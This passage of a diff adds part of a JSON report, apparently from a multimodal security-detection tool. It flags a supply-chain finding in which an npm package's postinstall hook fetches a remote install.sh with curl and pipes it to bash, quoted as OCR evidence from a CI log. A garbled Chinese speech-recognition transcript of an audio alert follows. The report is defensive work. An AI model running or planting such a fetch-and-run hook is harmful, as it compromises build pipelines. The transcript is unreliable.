+          "matched_keywords": [
+            "postinstall",
+            "curl"
+          ],
+          "entities": [
+            {
+              "type": "ip",
+              "value": "185.199.108.153",
+              "normalized": "185.199.108.153",
+              "start": 432,
+              "end": 447,
+              "confidence": 0.96,
+              "source": "regex",
+              "evidence": "w Expected OCR: npm install + postinstall lcurl 185.199.108.153/install.sh"
+            }
+          ],
+          "evidence": "GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9.9.2 p postinstall postinstall curl 185.199.108. .153/install.sh bash warning: unexpected external download during build artifact digest mismatch: sha256:87e3dd15 deploy blocked: prove...",
+          "confidence": 0.918,
+          "recommendation": "立即隔离相关依赖包和构建产物，固定私有源解析，封禁外联目标，并使用可信 runner 重新构建。",
+          "references": [
+            "https://sigmahq.io/sigma-specification/",
+            "https://github.com/SigmaHQ/sigma",
+            "https://wazuh.com/platform/overview/"
+          ],
+          "tags": [
+            "attack.supply_chain",
+            "attack.execution",
+            "multimodal.ocr",
+            "sigma-style",
+            "wazuh.severity.critical"
+          ],
+          "first_seen": "2026-06-03T07:53:59.216970+00:00",
+          "fingerprint": "multimodal-finding:b2364d83444672db"
+        }
+      ],
+      "risk_score": 96,
+      "risk_level": "critical"
+    },
+    {
+      "evidence_id": "MME-20260603075344011779-4A1F3B72",
+      "filename": "MME-20260603075344011779-4A1F3B72-audio-alert.wav",
+      "original_filename": "alert.wav",
+      "file_path": "C:\\Users\\86189\\Desktop\\sysml2\\storage\\multimodal\\MME-20260603075344011779-4A1F3B72-audio-alert.wav",
+      "relative_path": "storage/multimodal/MME-20260603075344011779-4A1F3B72-audio-alert.wav",
+      "source_type": "audio",
+      "mime_type": "audio/wav",
+      "size_bytes": 623256,
+      "sha256": "4a1f3b72e64de61bd001119181c242b412b1f53ad769dd2d64251853f6bf557c",
+      "uploaded_at": "2026-06-03T07:53:44.011779+00:00",
+      "metadata": {
+        "extension": ".wav",
+        "content_type": "audio/wav"
+      },
+      "derived": [],
+      "recognitions": [
+        {
+          "source_type": "audio",
+          "recognized_text": "凌晨3. 赤烤雷批爱出现一场外连 atmean export 接口访问两声高 请隔离购劲产务 并负合 provenance",
+          "confidence": 0.818,
+          "evidence_type": "audio_asr",
+          "engine": "faster-whisper/faster-whisper-tiny",
+          "source_path": "storage/multimodal/MME-20260603075344011779-4A1F3B72-audio-alert.wav",
+          "language": "zh",
+          "created_at": "2026-06-03T07:53:45.839112+00:00",
+          "segments": [
+            {
+              "start": 0.0,
+              "end": 5.0,
+              "text": "凌晨3. 赤烤雷批爱出现一场外连",
+              "confidence": 0.818
+            },
+            {
+              "start": 5.0,
+              "end": 9.0,
+              "text": "atmean export 接口访问两声高",
+              "confidence": 0.818
+            },
+            {
+              "start": 9.0,
+              "end": 14.0,
+              "text": "请隔离购劲产务 并负合 provenance",
+              "confidence": 0.818
+            }
+          ]
+        }
+      ],
+      "entities": [],
+      "findings": [],
+      "risk_score": 0,
+      "risk_level": "low"
+    }
+  ]
+}
